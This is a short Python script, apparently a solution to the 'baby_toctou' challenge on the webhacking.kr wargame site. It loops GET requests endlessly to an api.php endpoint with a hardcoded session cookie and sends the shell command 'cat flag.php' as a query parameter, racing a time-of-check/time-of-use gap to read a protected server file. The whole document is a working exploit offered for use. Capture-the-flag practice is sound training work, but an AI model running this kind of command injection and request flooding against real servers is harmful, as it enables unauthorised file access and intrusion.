import requests


URL = "http://webhacking.kr:10019/api.php"
SESSION_ID = "42k3odbmn13sus7k9ad4nestaq"
cookies = {'PHPSESSID':SESSION_ID, 'baby_toctou':'68064f8a2fa2b55643158'}

params ={'q':'cat flag.php'}
while True:
    response = requests.get(URL, params=params, cookies=cookies)
    print(response.text)

